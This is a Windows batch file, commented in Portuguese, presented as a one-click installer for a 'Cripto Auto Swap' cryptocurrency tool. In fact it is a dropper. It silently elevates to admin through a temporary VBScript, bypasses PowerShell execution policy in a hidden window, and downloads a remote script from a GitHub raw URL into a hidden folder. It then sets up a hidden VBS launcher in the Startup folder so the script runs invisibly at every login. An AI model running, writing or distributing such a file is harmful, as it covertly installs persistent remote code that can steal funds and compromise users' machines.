@echo off
:: =====================================================
:: INSTALADOR UNICO - CRIPTO AUTO SWAP (Windows 10/11)
:: Clique 2x, clique Sim, e esqueca.
:: =====================================================

:: 1. AUTO-ELEVACAO SILENCIOSA
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\cs_getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 0 >> "%temp%\cs_getadmin.vbs"
    wscript.exe "%temp%\cs_getadmin.vbs"
    del "%temp%\cs_getadmin.vbs" >nul 2>&1
    exit /B
)

:: 2. AUTO-DESBLOQUEIO
powershell -Command "Unblock-File -Path '%~f0'" >nul 2>&1

:: 3. EXECUTAR INSTALACAO COMPLETA VIA POWERSHELL (Invisivel)
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$d=[Environment]::GetFolderPath('MyDocuments');$i=Join-Path $d 'CriptoAutoSwap';$s=Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup';$p=Join-Path $i 'CriptoMonitor.ps1';$v=Join-Path $s 'CriptoMonitor.vbs';if(!(Test-Path $i)){md $i -Force|Out-Null};attrib +h $i;$c=(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/espertin/social/main/CriptoMonitor.ps1');[IO.File]::WriteAllText($p,$c);Unblock-File $p;$q=[char]34;$t='Set WshShell = CreateObject('+$q+'WScript.Shell'+$q+')'+[Environment]::NewLine+'WshShell.Run '+$q+'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File '+$q+$q+$p+$q+$q+$q+', 0, False';[IO.File]::WriteAllText($v,$t);Unblock-File $v;Start-Process wscript.exe -ArgumentList (''+$q+$v+$q+'') -WindowStyle Hidden"

:: 4. FECHAR
exit
